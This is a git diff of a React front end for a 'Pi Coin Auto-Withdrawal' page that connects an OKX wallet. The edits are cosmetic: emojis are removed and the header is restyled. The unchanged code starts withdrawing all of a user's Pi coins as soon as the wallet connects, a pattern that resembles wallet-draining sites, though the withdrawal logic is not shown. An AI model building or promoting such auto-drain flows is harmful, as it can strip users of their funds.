@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import { useState, useEffect } from 'react';
 import './App.css';
 import okxWalletService from './services/okxWalletService';
 import type { WalletInfo, PiWithdrawalResult } from './services/okxWalletService';
@@ -69,10 +69,10 @@ function App() {
         setSuccess('✅ Wallet connected! Starting Pi coin withdrawal...');
         await withdrawPiCoins();
       } else {
-        setSuccess('✅ Wallet connected! No Pi coins found for withdrawal.');
+        setSuccess('Wallet connected! No Pi coins found for withdrawal.');
       }
     } catch (err: any) {
-      setError(`❌ ${err.message}`);
+      setError(`${err.message}`);
     } finally {
       setLoading(false);
     }
@@ -172,20 +172,30 @@ function App() {
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
-    setSuccess('✅ Copied to clipboard!');
+    setSuccess('Copied to clipboard!');
   };
 
   return (
     <div className="App">
       <header className="header">
         <div className="container">
-          <h1>🪙 Pi Coin Auto-Withdrawal</h1>
+          <h1 style={{
+            fontFamily: "'Cormorant Garamond', 'Crimson Text', serif",
+            letterSpacing: "0.1em",
+            color: "#1a365d",
+            fontSize: "clamp(2.8rem, 7vw, 3rem)", 
+            fontWeight: "600",
+            textAlign: "center",
+            textTransform: "capitalize",
+            textShadow: "3px 3px 6px rgba(26,54,93,0.12)",
+            position: "relative",
+            padding: "0.75rem",
+            lineHeight: "1.4",
+            borderBottom: "2px solid rgba(26,54,93,0.08)",
+            display: "inline-block",
+            fontStyle: "italic"
+          }}>Pi Coin Auto-Withdrawal</h1>
           <p>Connect your OKX wallet and automatically withdraw all Pi coins</p>
-          <div className="header-decoration">
-            <div className="decoration-dot"></div>
-            <div className="decoration-dot"></div>
-            <div className="decoration-dot"></div>
-          </div>
         </div>
       </header>
 
@@ -230,7 +240,7 @@ function App() {
             {!walletInfo?.isConnected ? (
               <div className="connection-section">
                 <div className="wallet-instructions">
-                  <h3>📋 Instructions</h3>
+                  <h3>Instructions</h3>
                   <ol>
                     <li>Install OKX Wallet browser extension</li>
                     <li>Make sure you have Pi coins in your wallet</li>
@@ -257,7 +267,7 @@ function App() {
                 
                 <div className="wallet-status">
                   {typeof window.okxwallet !== 'undefined' ? (
-                    <div className="status-ok">✅ OKX Wallet detected</div>
+                    <div className="status-ok">OKX Wallet detected</div>
                   ) : (
                     <div className="status-error">❌ OKX Wallet not found. Please install the extension.</div>
                   )}
@@ -266,7 +276,7 @@ function App() {
             ) : (
               <div className="wallet-info">
                 <div className="wallet-header">
-                  <h3>✅ Connected Wallet</h3>
+                  <h3>Connected Wallet</h3>
                   <button className="disconnect-btn" onClick={disconnectWallet}>
                     Disconnect
                   </button>
@@ -375,7 +385,7 @@ function App() {
           </div>
           
           <div className="info-card">
-            <h3>ℹ️ Important Information</h3>
+            <h3>Important Information</h3>
             <ul>
               <li>✅ This app automatically withdraws ALL Pi coins from your connected wallet</li>
               <li>✅ Make sure you trust the target wallet address before connecting</li>
